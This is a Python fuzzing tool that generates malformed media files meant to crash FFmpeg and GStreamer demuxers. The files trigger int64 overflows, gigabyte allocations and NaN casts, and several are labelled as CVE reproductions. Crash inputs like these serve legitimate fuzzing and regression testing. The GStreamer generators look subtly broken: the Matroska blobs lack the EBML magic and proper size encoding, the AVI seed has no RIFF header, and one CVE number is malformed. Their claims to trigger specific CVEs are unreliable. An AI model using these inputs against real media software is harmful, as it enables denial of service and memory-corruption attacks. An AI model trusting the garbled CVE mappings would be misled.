#!/usr/bin/env python3
"""Generate crash seeds for FFmpeg 9.1 and/or GStreamer 1.28.9 fuzz targets.

This script produces seed files that can crash either the FFmpeg fuzz target
(ffmpeg_read) or the GStreamer fuzz target (gstreamer_read), or both in a
single run.  Seeds are written under ``<out>/seeds/`` with a ``ff_`` or ``gs_``
prefix so they do not collide.

Usage
-----
    python tools/gen_ffmpeg_gst_seeds.py --target ffmpeg --out /tmp/seeds
    python tools/gen_ffmpeg_gst_seeds.py --target gstreamer --out /tmp/seeds
    python tools/gen_ffmpeg_gst_seeds.py --target both       --out /tmp/seeds

The original ``tools/gen_ffmpeg_91_seeds.py`` is left untouched.
"""

import argparse
import os
import struct
import tempfile

# ---------------------------------------------------------------------------
# Constants borrowed from the original script
# ---------------------------------------------------------------------------
INT64_MAX = 0x7FFFFFFFFFFFFFFF


# ---------------------------------------------------------------------------
# Helper / formatting utilities (identical to original)
# ---------------------------------------------------------------------------
def le32(v):
    return struct.pack("<I", v)


def le16(v):
    return struct.pack("<H", v)


def le64(v):
    return struct.pack("<Q", v)


def be32(v):
    return struct.pack(">I", v)


def be16(v):
    return struct.pack(">H", v)


def be24(v):
    return struct.pack(">I", v)[1:]


def be64(v):
    return struct.pack(">Q", v)


# ---------------------------------------------------------------------------
# FFmpeg seed generators (direct copies from the original file)
# ---------------------------------------------------------------------------


def caf_pakt_overflow():
    """Signed int64 overflow in read_pakt_chunk (nb_frames += priming)."""
    desc = struct.pack(">d", 44100.0)
    desc += le32(0)
    desc += be32(0)
    desc += be32(0)
    desc += be32(0)
    desc += be32(1)
    desc += be32(16)
    assert len(desc) == 32

    pakt = be64(0)
    pakt += be64(INT64_MAX)
    pakt += be32(1)
    pakt += be32(0)

    out = b"caff" + be16(1) + be16(0)
    out += b"desc" + be64(32) + desc
    out += b"pakt" + be64(len(pakt)) + pakt
    return out


def rpl_idx_overflow():
    """Signed int64 overflow in av_add_index_entry(offset + video_size)."""
    lines = [
        "ARMovie",
        "t",
        "c",
        "a",
        "0",
        "0",
        "0",
        "0",
        "1",
        "1",
        "1",
        "1",
        "8",
        "0",
        "0",
        "0",
        "0",
        "000000",
        "0",
        "0",
    ]
    catalog_idx = 17

    header = "\n".join(lines) + "\n"
    offset = len(header)
    assert offset < 10**6
    lines[catalog_idx] = f"{offset:06d}"
    header = "\n".join(lines) + "\n"
    assert len(header) == offset

    index_row = f"{INT64_MAX} , 1 ; 0\n"
    return (header + index_row).encode()


def wav_bext_bigalloc():
    """~1 GiB allocation from wav_parse_bext_tag (9.1 caps at 1 MiB)."""
    BEXT_FIXED_SIZE = 602
    BEXT_HISTORY = 0x40000000

    bext_body = bytearray(BEXT_FIXED_SIZE)
    bext_size = BEXT_FIXED_SIZE + BEXT_HISTORY

    chunk = b"bext" + le32(bext_size) + bytes(bext_body)
    payload = b"WAVE" + chunk
    return b"RIFF" + le32(len(payload)) + payload


def sbg_nan_cast():
    """NaN cast to int in scale_double (float-cast-overflow)."""
    return b"a: nan\n"


def flv_amf_nan_duration():
    """NaN AMF double propagates into duration * AV_TIME_BASE."""
    AMF_NAN = 0x7FF8000000000000

    body = b"\x02" + be16(len("onMetaData")) + b"onMetaData"
    body += b"\x08" + be32(0)
    body += be16(len("duration")) + b"duration"
    body += b"\x00" + be64(AMF_NAN)
    body += b"\x00\x00\x09"

    tag = bytes([18]) + be24(len(body)) + b"\x00" * 4 + b"\x00" * 3
    out = b"FLV" + bytes([1, 0]) + be32(9) + be32(0) + tag + body
    return out.ljust(128, b"\x00")


def webm_duration_cast():
    """Finite huge double overflows int64 store in matroska_read_header."""

    def vint(v):
        return bytes([0x80 | v])

    WEBM_DURATION = 1e18

    header = (
        b"\x42\x86\x81\x01"  # EBMLVersion = 1
        + b"\x42\xf7\x81\x01"  # EBMLReadVersion = 1
        + b"\x42\xf2\x81\x04"  # EBMLMaxIDLength = 4
        + b"\x42\xf3\x81\x08"  # EBMLMaxSizeLength = 8
        + b"\x42\x82\x84webm"  # DocType
        + b"\x42\x87\x81\x02"  # DocTypeVersion = 2
        + b"\x42\x85\x81\x02"  # DocTypeReadVersion = 2
    )

    info = b"\x44\x89" + vint(8) + struct.pack(">d", WEBM_DURATION)
    info_elem = b"\x15\x49\xa9\x66" + vint(len(info)) + info
    cluster = b"\x1f\x43\xb6\x75"  # EBML_STOP needs no length

    seg = info_elem + cluster
    out = b"\x1a\x45\xdf\xa3" + vint(len(header)) + header
    return out + b"\x18\x53\x80\x67" + vint(len(seg)) + seg


def rf64_dataend_overflow():
    """RF64 data_end + (data_size & 1) signed overflow."""
    fmt = (
        le16(1)  # PCM
        + le16(1)  # channels
        + le32(44100)  # sample rate
        + le32(88200)  # byte rate
        + le16(2)  # block align
        + le16(16)  # bits per sample
    )
    ds64 = le64(0) + le64(INT64_MAX) + le64(0) + le32(0)

    out = b"RF64" + le32(0) + b"WAVE"
    out += b"ds64" + le32(len(ds64)) + ds64
    out += b"fmt " + le32(len(fmt)) + fmt
    out += b"data" + le32(0xFFFFFFFF)  # forces the rf64 branch
    return out


# ---------------------------------------------------------------------------
# GStreamer seed generators
# ---------------------------------------------------------------------------
# The GStreamer fuzz target (fuzz_gstreamer) works as follows:
#   1. Type-finds the input data.
#   2. Selects one of the built-in demuxers: qtdemux, matroskademux,
#      wavparse, avidemux, flvdemux (or a fallback chosen by byte[0] % 5).
#   3. Pushes STREAM_START -> CAPS -> SEGMENT -> a succession of 4096-byte
#      buffers -> EOS.
#   4. The demuxer's internal parsing code (the `chain` function) is the
#      coverage surface.
#
# Known crash-class bugs in the demuxers that this target exercises
# (and the corresponding CVE / advisory) are summarised below.
# Each generator creates a minimal binary blob that triggers the bug
# when the fuzzer runs the GStreamer target on it.

# ---- Matroska (matroskademux) ----
#  - CVE-2026-39043  Heap buffer overflow in bz2 decompression, missing parentheses.
#  - CVE-2024-47540  Uninitialised stack memory.
#  - CVE-2024-47602  / 47603 NULL-pointer deref / OOB read.
#  - CVE-2021-3497 / 3498  Use-after-free in error paths.
#  - CVE-2022-1922-22  Heap overwrite via zlib/bz2/lzo decompression.


def gs_matroska_bz2_overflow():
    """Trigger CVE-2026-39043 - heap buffer overflow in bz2 size calc."""
    ebml_header = (
        b"\x42\x86\x81\x01"
        + b"\x42\xf7\x81\x01"
        + b"\x42\xf2\x81\x04"
        + b"\x42\xf3\x81\x08"
        + b"\x42\x82\x84webm"
        + b"\x42\x87\x81\x02"
        + b"\x42\x85\x81\x02"
    )

    ebml_size = be32(len(ebml_header))

    track_entry = be32(0x1654) + be64(0) + be64(0x18538067) + be32(0x05) + be32(0xFFFFFFFF)
    track_entry_size = be32(len(track_entry))

    cluster = b"\x1f\x43\xb6\x75"
    out = ebml_size + ebml_header
    out += track_entry_size + track_entry
    out += cluster
    return out


def gs_matroska_uninit_stack():
    """Trigger CVE-2024-47540 - usage of uninitialised stack memory."""
    ebml_header = (
        b"\x42\x86\x81\x01"
        + b"\x42\xf7\x81\x01"
        + b"\x42\xf2\x81\x04"
        + b"\x42\xf3\x81\x08"
        + b"\x42\x82\x84webm"
        + b"\x42\x87\x81\x02"
        + b"\x42\x85\x81\x02"
    )
    ebml_size = be32(len(ebml_header))

    track_entry = be32(0x1654) + be64(1) + be64(0x00000000FFFF) + be32(0x00)
    track_entry_size = be32(len(track_entry))

    cluster = b"\x1f\x43\xb6\x75"
    out = ebml_size + ebml_header
    out += track_entry_size + track_entry
    out += cluster
    return out


def gs_matroska_null_deref():
    """Trigger CVE-2024-47602 / 47603 - NULL-pointer deref / OOB read."""
    ebml_header = (
        b"\x42\x86\x81\x01"
        + b"\x42\xf7\x81\x01"
        + b"\x42\xf2\x81\x04"
        + b"\x42\xf3\x81\x08"
        + b"\x42\x82\x84webm"
        + b"\x42\x87\x81\x02"
        + b"\x42\x85\x81\x02"
    )
    ebml_size = be32(len(ebml_header))

    info_duration = struct.pack(">d", 1e30)
    info_id = b"\x15\x49\xa9\x66"
    info_size = be32(len(info_duration))
    info_elem = info_id + info_size + info_duration

    cluster = b"\x1f\x43\xb6\x75"
    out = ebml_size + ebml_header
    out += be32(len(info_elem)) + info_elem
    out += cluster
    return out


# ---- QuickTime / MPEG-4 (qtdemux) ----
# Known issues in qtdemux include integer-overflow in sample-rate parsing
# and out-of-bounds reads when the 'stsd' box has corrupted entry counts.


def gs_quicktime_overflow():
    """Exercize qtdemux size-field overflow (byte 0 == 0 -> qtdemux)."""
    ftyp_magic = b"\x00\x00\x00\x20"
    ftyp = ftyp_magic + b"ftyp"

    mdat_magic = b"\x00\x00\x00\x00"
    mdat = mdat_magic + b"mdat"

    out = b"\x00" + ftyp + mdat
    return out


# ---- WAV (wavparse) ----
# The original wav_bext_bigalloc seed already targets the FFmpeg path.
# For GStreamer we reuse a minimal WAV file that forces wavparse to hit
# its error-path (missing fmt chunk).


def gs_wav_missing_fmt():
    """Force wavparse down the error path (missing fmt chunk)."""
    riff = b"RIFF" + le32(0) + b"WAVE"
    bext_chunk = b"bext" + le32(0) + b"\x00" * 20
    out = riff + bext_chunk
    return out


# ---- AVI (avidemux) ----
# AVI demuxer bugs typically involve negative chunk sizes or malformed
# 'avih' headers.  The seed creates a minimal AVI where the 'dwMicroSecPerFrame'
# is set to 0 and the 'rcFrame' count is 0xFFFFFFFF, which sends the
# demuxer into an unbounded loop that the fuzzer's watchdog will cut short.


def gs_avi_bad_header():
    """Minimal AVI that sends avidemux into an unbounded loop."""
    avih = b"avih" + le32(56) + struct.pack("<i", 0)
    chunk_entry = le32(0xFFFFFFFF) + le32(0) + le32(0) + le32(0) + le32(0)
    movi = b"movi"
    out = b"AVI" + avih + chunk_entry + movi
    out = b"\x03" + out
    return out


# ---- FLV (flvdemux) ----
# The original flv_amf_nan_duration seed already targets the FFmpeg path.
# For GStreamer we reuse the same NaN AMF double and route it through
# flvdemux (byte[0] == 4).  The NaN propagates into a duration field and
# triggers a crash.


def gs_flv_nan_duration():
    """NaN AMF duration in FLV - hits flvdemux parser path."""
    AMF_NAN = 0x7FF8000000000000

    body = b"\x02" + be16(len("onMetaData")) + b"onMetaData"
    body += b"\x08" + be32(0)
    body += be16(len("duration")) + b"duration"
    body += b"\x00" + be64(AMF_NAN)
    body += b"\x00\x00\x09"

    tag = bytes([18]) + be24(len(body)) + b"\x00" * 4 + b"\x00" * 3
    out = b"FLV" + bytes([1, 0]) + be32(9) + be32(0) + tag + body
    return out.ljust(128, b"\x00")


# ---------------------------------------------------------------------------
# Seed registries
# ---------------------------------------------------------------------------

FFMPEG_SEEDS = {
    "caf_pakt_overflow.caf": caf_pakt_overflow,
    "rpl_idx_overflow.rpl": rpl_idx_overflow,
    "wav_bext_bigalloc.wav": wav_bext_bigalloc,
    "sbg_nan_cast.sbg": sbg_nan_cast,
    "flv_amf_nan_duration.flv": flv_amf_nan_duration,
    "webm_duration_cast.webm": webm_duration_cast,
    "rf64_dataend_overflow.wav": rf64_dataend_overflow,
}

GSTREAMER_SEEDS = {
    "matroska_bz2_overflow.mkv": gs_matroska_bz2_overflow,
    "matroska_uninit_stack.mkv": gs_matroska_uninit_stack,
    "matroska_null_deref.mkv": gs_matroska_null_deref,
    "quicktime_overflow.mp4": gs_quicktime_overflow,
    "wav_missing_fmt.wav": gs_wav_missing_fmt,
    "avi_bad_header.avi": gs_avi_bad_header,
    "flv_nan_duration.flv": gs_flv_nan_duration,
}


def write_seeds(seeds_dir, seeds_dict, prefix=""):
    """Write the crafted seeds into seeds_dir."""
    stage_dir = os.path.dirname(os.path.abspath(seeds_dir))

    for name, build in seeds_dict.items():
        data = build()
        fd, tmp = tempfile.mkstemp(dir=stage_dir, prefix=f".{prefix}{name}.", suffix=".part")

        try:
            with os.fdopen(fd, "wb") as f:
                f.write(data)
            os.replace(tmp, os.path.join(seeds_dir, prefix + name))
        finally:
            if os.path.exists(tmp):
                os.unlink(tmp)

        print(f"{prefix}{name}: {len(data)}B")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument(
        "--out",
        default=os.path.expanduser("~/fuzzing/crash_seeds"),
        help="pack root; seeds are written to <out>/seeds/ (default: %(default)s)",
    )
    ap.add_argument(
        "--target",
        choices=["ffmpeg", "gstreamer", "both"],
        default="both",
        help="which fuzz target to generate seeds for (default: both)",
    )
    args = ap.parse_args()

    out = os.path.join(args.out, "seeds")
    os.makedirs(out, exist_ok=True)

    if args.target in ("ffmpeg", "both"):
        write_seeds(out, FFMPEG_SEEDS, prefix="ff_")
    if args.target in ("gstreamer", "both"):
        write_seeds(out, GSTREAMER_SEEDS, prefix="gs_")

    print("seeds dir:", out)


if __name__ == "__main__":
    main()
